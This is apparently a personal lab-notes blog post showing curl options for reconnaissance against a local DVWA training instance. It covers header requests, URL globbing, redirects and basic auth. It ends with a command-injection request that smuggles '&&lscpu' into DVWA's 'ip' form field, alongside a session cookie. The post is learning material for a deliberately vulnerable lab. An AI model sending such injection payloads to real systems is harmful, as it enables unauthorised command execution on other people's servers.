---
title: "Curlacking"
date: 2025-01-09T16:06:04+01:00
draft: false
---

Launched 1998, curl is a tool for transferring data from or to a server using URLs, with over 230 command line options. This briefly shows some of the ways to use it for reconnosince and 



curl -I http://192.168.10.123/dvwa/
	-I just returns the head

![[Screenshot 2025-01-09 at 3.56.45 pm.png]]

curl https://example.com/[1-9].html


curl https://example.com/[1-20:3].html - o save_#1.html (will save )


curl --verbose https://example.com/[a-z].html #(very important for troubleshooting)

curl  -L http://192.168.10.123/dvwa/vulnerabilities/fi/?page=include.php
	-L will show the redirect

Without:![[Screenshot 2025-01-09 at 5.24.52 pm.png]]

With:
![[Screenshot 2025-01-09 at 5.25.33 pm.png]]
man 
curl -u user:password
![[Screenshot 2025-01-23 at 4.59.52 pm.png]]


After quite a few attempts and a small bit of AI help: 
	curl -vv -b "security=low; PHPSESSID=ungj5i2cirq9jvfrsjju273l53" --data "ip=192.168.10.123%26%26lscpu&Submit=Submit" http://192.168.10.123/dvwa/vulnerabilities/exec/

Lets break this down... 

- curl -----(http swiss army knife)
- -vv -----very verbose
- -b ----set-cookie
- "security=low; PHPSESSID=ungj5i2cirq9jvfrsjju273l53" ---- cookie
- --data ------ includes url-encoded injection payload
- "ip=192.168.10.123%26%26lscpu&Submit=Submit" ------ payload
- http://192.168.10.123/dvwa/vulnerabilities/exec/


![[Screenshot 2025-01-24 at 7.28.53 am.png]]

![[Screenshot 2025-01-24 at 7.28.13 am.png]]

Resources:

https://www.youtube.com/watch?v=I6id1Y0YuNk